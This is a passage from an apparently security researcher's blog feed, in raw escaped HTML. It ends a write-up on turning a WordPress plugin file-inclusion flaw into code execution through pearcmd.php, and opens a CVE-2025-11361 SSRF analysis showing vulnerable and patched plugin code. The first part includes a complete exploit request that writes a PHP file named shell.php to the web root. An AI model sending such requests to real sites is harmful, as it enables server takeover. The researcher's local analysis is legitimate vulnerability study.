&lt;code&gt;$params&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;list($tmpopt, $params) = $tmp;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png&#34; title=&#34;Value of $params in the debugger&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png&#34; data-sub-html=&#34;&lt;h2&gt;params&lt;/h2&gt;&lt;p&gt;Value of $params in the debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png&#39; alt=&#34;params&#34; height=&#34;244&#34; width=&#34;1634&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Value of $params in the debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Finally, &lt;code&gt;$cmd&lt;/code&gt; is executed via &lt;code&gt;$cmd-&amp;gt;run()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$ok = $cmd-&amp;gt;run($command, $opts, $params);&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Send a GET request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;amp;object_ids=2&amp;amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;amp;&amp;#43;config-create&amp;#43;/test_root_path&amp;#43;test_filename.php&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;The web app &lt;code&gt;include&lt;/code&gt;s &lt;code&gt;/usr/local/lib/php/pearcmd.php&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;PHP (with register_argc_argv=On) builds &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; from the query → &lt;code&gt;[&#39;action=geo_mashup_query&amp;amp;object_ids=2&amp;amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;amp;&#39;,&#39;config-create&#39;,&#39;/test_root_path&#39;,&#39;test_filename.php&#39;]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;Console_Getopt::readPHPArgv()&lt;/code&gt; returns &lt;code&gt;$argv&lt;/code&gt;; &lt;code&gt;Console_Getopt::getopt2()&lt;/code&gt; parses and yields &lt;code&gt;$command=&#39;config-create&#39;&lt;/code&gt; and &lt;code&gt;list($tmpopt, $params)&lt;/code&gt; gives &lt;code&gt;$params=[&#39;/test_root_path&#39;,&#39;test_filename.php&#39;]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;doConfigCreate()&lt;/code&gt; runs with &lt;code&gt;$params&lt;/code&gt; controlled by the attacker → &lt;code&gt;touch()&lt;/code&gt;/&lt;code&gt;realpath()&lt;/code&gt; and &lt;code&gt;writeConfigFile()&lt;/code&gt; create/write the file.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;The created config file contains the &lt;code&gt;root path&lt;/code&gt; value. If this value is written as a valid PHP tag (&lt;code&gt;&amp;lt;?php ... ?&amp;gt;&lt;/code&gt;) and the file is accessible by the client, the webserver will process the PHP content in that file and the code will be executed, leading to &lt;strong&gt;RCE&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Leveraging &lt;a href=&#34;https://w41bu1.github.io/2025-10-13-cve-2025-48293/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48293&lt;/a&gt; analyzed earlier to expand into an exploit via &lt;code&gt;pearcmd.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Send a request with an LFI payload pointing to &lt;code&gt;pearcmd.php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;amp;object_ids=2&amp;amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;amp;&amp;#43;config-create&amp;#43;/&amp;lt;?=phpinfo();?&amp;gt;&amp;#43;/var/www/html/shell.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-admin/&#xA;Connection: keep-alive&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: same-origin&#xA;Sec-Fetch-User: ?1&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0, i&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Successful response returned&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png&#34; title=&#34;Successful response&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png&#34; data-sub-html=&#34;&lt;h2&gt;res2&lt;/h2&gt;&lt;p&gt;Successful response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png&#39; alt=&#34;res2&#34; height=&#34;937&#34; width=&#34;1536&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Successful response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Accessing &lt;code&gt;shell.php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png&#34; title=&#34;shell.php&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png&#34; data-sub-html=&#34;&lt;h2&gt;shell&lt;/h2&gt;&lt;p&gt;shell.php&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png&#39; alt=&#34;shell&#34; height=&#34;1078&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;shell.php&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11361 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-22-cve-2025-11361/</link>
      <pubDate>Wed, 22 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-22-cve-2025-11361/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-22-cve-2025-11361/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Gutenberg Essential Blocks – Page Builder for Gutenberg Blocks &amp;amp; Patterns&lt;/strong&gt; plugin for &lt;strong&gt;WordPress&lt;/strong&gt; is vulnerable to &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; in all versions up to and including &lt;strong&gt;5.7.1&lt;/strong&gt;, via the function &lt;strong&gt;eb_save_ai_generated_image&lt;/strong&gt;.&lt;br&gt;&#xA;This allows an authenticated attacker with &lt;strong&gt;Author-level&lt;/strong&gt; privileges or higher to perform web requests to arbitrary addresses from the web application, and can be abused to query and exfiltrate information from internal services.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11361&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11361&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.7.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.7.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Author&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/essential-blocks/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Essential Blocks for Gutenberg Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Essential Blocks for Gutenberg&lt;/strong&gt;: &lt;strong&gt;5.7.1&lt;/strong&gt; (vulnerable) and &lt;strong&gt;5.7.2&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff/comparison tool to inspect differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Vulnerable code&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function eb_save_ai_generated_image()&#xA;{&#xA;    if ( ! isset( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ), &amp;#39;admin-nonce&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;Nonce Error&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;    if ( ! current_user_can( &amp;#39;upload_files&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;You are not authorized to upload files!&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;    // Check if we have either image_url or image_b64 along with prompt&#xA;    if ( ( isset( $_POST[ &amp;#39;image_url&amp;#39; ] ) || isset( $_POST[ &amp;#39;image_b64&amp;#39; ] ) ) &amp;amp;&amp;amp; isset( $_POST[ &amp;#39;prompt&amp;#39; ] ) ) {&#xA;        $image_url   = isset( $_POST[ &amp;#39;image_url&amp;#39; ] ) ? esc_url_raw( $_POST[ &amp;#39;image_url&amp;#39; ] ) : null;&#xA;        $image_body = &amp;#39;&amp;#39;;&#xA;        // Handle URL format&#xA;        if ( $image_url ) {&#xA;            // Download the image from OpenAI URL&#xA;            $image_data = wp_remote_get( $image_url, [&#xA;                &amp;#39;timeout&amp;#39; =&amp;gt; 60&#xA;                ] );&#xA;            if ( is_wp_error( $image_data ) ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Failed to download image from OpenAI.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                    ] );&#xA;                return;&#xA;            }&#xA;            // Detect image format and set appropriate extension and MIME type&#xA;            $image_info = getimagesizefromstring( $image_body );&#xA;            $mime_type  = $image_info ? $image_info[ &amp;#39;mime&amp;#39; ] : &amp;#39;image/png&amp;#39;;&#xA;&#xA;            // Determine file extension based on MIME type&#xA;            $extension = &amp;#39;png&amp;#39;; // default&#xA;            switch ( $mime_type ) {&#xA;                case &amp;#39;image/jpeg&amp;#39;:&#xA;                    $extension = &amp;#39;jpg&amp;#39;;&#xA;                    break;&#xA;                case &amp;#39;image/png&amp;#39;:&#xA;                    $extension = &amp;#39;png&amp;#39;;&#xA;                    break;&#xA;                case &amp;#39;image/webp&amp;#39;:&#xA;                    $extension = &amp;#39;webp&amp;#39;;&#xA;                    break;&#xA;                case &amp;#39;image/gif&amp;#39;:&#xA;                    $extension = &amp;#39;gif&amp;#39;;&#xA;                    break;&#xA;            }&#xA;            $image_body = wp_remote_retrieve_body( $image_data );&#xA;        }&#xA;        // other logic&#xA;    } else {&#xA;        wp_send_json_error( __( &amp;#39;Image data (URL or base64) and prompt are required&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version, the code uses &lt;code&gt;wp_remote_get($image_url)&lt;/code&gt; to download an image without validating or restricting the source URL. It does not check the HTTP response code, the MIME type, or the actual content of the returned file, allowing an attacker to abuse this to perform SSRF to internal services or to download malicious content disguised as an image.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched code&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function eb_save_ai_generated_image()&#xA;{&#xA;    if ( ! isset( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ), &amp;#39;admin-nonce&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;Nonce Error&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;    if ( ! current_user_can( &amp;#39;upload_files&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;You are not authorized to upload files!&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;    // Check if we have either image_url or image_b64 along with prompt&#xA;    if ( ( isset( $_POST[ &amp;#39;image_url&amp;#39; ] ) || isset( $_POST[ &amp;#39;image_b64&amp;#39; ] ) ) &amp;amp;&amp;amp; isset( $_POST[ &amp;#39;prompt&amp;#39; ] ) ) {&#xA;        $image_url   = isset( $_POST[ &amp;#39;image_url&amp;#39; ] ) ? esc_url_raw( $_POST[ &amp;#39;image_url&amp;#39; ] ) : null;&#xA;        $image_body = &amp;#39;&amp;#39;;&#xA;        // Handle URL format&#xA;        if ( $image_url ) {&#xA;            // Download the image from validated URL&#xA;            $image_data = wp_safe_remote_get( $image_url, [&#xA;                &amp;#39;timeout&amp;#39;     =&amp;gt; 30,&#xA;                &amp;#39;redirection&amp;#39; =&amp;gt; 3,&#xA;                &amp;#39;user-agent&amp;#39;  =&amp;gt; &amp;#39;Essential Blocks/&amp;#39; . ESSENTIAL_BLOCKS_VERSION,&#xA;                &amp;#39;headers&amp;#39;     =&amp;gt; [&#xA;                    &amp;#39;Accept&amp;#39; =&amp;gt; &amp;#39;image/*&amp;#39;&#xA;                    ]&#xA;                ] );&#xA;            if ( is_wp_error( $image_data ) ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Failed to download image from URL.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                    ] );&#xA;                return;&#xA;            }&#xA;            // Validate response&#xA;            $response_code = wp_remote_retrieve_response_code( $image_data );&#xA;            if ( $response_code !== 200 ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Invalid response from image URL.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                    ] );&#xA;                return;&#xA;            }&#xA;            // Security: Validate image content and size&#xA;            if ( ! $this-&amp;gt;is_valid_image_content( $image_body ) ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Invalid image content provided.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                 ] );&#xA;                return;&#xA;            }&#xA;            // Detect image format and set appropriate extension and MIME type&#xA;            $image_info = getimagesizefromstring( $image_body );&#xA;            if ( ! $image_info ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Unable to determine image format.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                 ] );&#xA;                return;&#xA;            }&#xA;&#xA;            $mime_type = $image_info[ &amp;#39;mime&amp;#39; ];&#xA;&#xA;            // Security: Only allow specific image MIME types&#xA;            $allowed_mime_types = [&#xA;                &amp;#39;image/jpeg&amp;#39;,&#xA;                &amp;#39;image/png&amp;#39;,&#xA;                &amp;#39;image/webp&amp;#39;,&#xA;                &amp;#39;image/gif&amp;#39;&#xA;             ];&#xA;&#xA;            if ( ! in_array( $mime_type, $allowed_mime_types, true ) ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Unsupported image format.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                 ] );&#xA;                return;&#xA;            }&#xA;            $image_body = wp_remote_retrieve_body( $image_data );&#xA;        }&#xA;        // other logic&#xA;    } else {&#xA;        wp_send_json_error( __( &amp;#39;Image data (URL or base64) and prompt are required&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch replaces &lt;code&gt;wp_remote_get()&lt;/code&gt; with &lt;code&gt;wp_safe_remote_get()&lt;/code&gt; to block access to internal addresses, adds HTTP response code checks, validates the content and format of the image (&lt;code&gt;is_valid_image_content()&lt;/code&gt; and allowed MIME types), and reduces timeout and redirects — improving safety and mitigating SSRF by handling response data more securely.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function is_valid_image_content( $image_data )&#xA;{&#xA;    if ( empty( $image_data ) ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Check file size (max 10MB)&#xA;    $max_size = 10 * 1024 * 1024; // 10MB&#xA;    if ( strlen( $image_data ) &amp;gt; $max_size ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Validate image using getimagesizefromstring&#xA;    $image_info = getimagesizefromstring( $image_data );&#xA;    if ( ! $image_info ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Check image dimensions (reasonable limits)&#xA;    $max_width  = 4096;&#xA;    $max_height = 4096;&#xA;    if ( $image_info[ 0 ] &amp;gt; $max_width || $image_info[ 1 ] &amp;gt; $max_height ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Additional security: Check for suspicious content patterns&#xA;    // Look for common file signatures that shouldn&amp;#39;t be in images&#xA;    $suspicious_patterns = [&#xA;        &amp;#39;&amp;lt;?php&amp;#39;, // PHP code&#xA;        &amp;#39;&amp;lt;script&amp;#39;, // JavaScript&#xA;        &amp;#39;javascript:&amp;#39;, // JavaScript protocol&#xA;        &amp;#39;data:text/&amp;#39;, // Text data URLs&#xA;        &amp;#39;&amp;lt;html&amp;#39;, // HTML content&#xA;        &amp;#39;#!/bin/&amp;#39; // Shell scripts&#xA;        ];&#xA;&#xA;    $data_start = substr( $image_data, 0, 1024 ); // Check first 1KB&#xA;    foreach ( $suspicious_patterns as $pattern ) {&#xA;        if ( stripos( $data_start, $pattern ) !== false ) {&#xA;            return false;&#xA;        }&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; 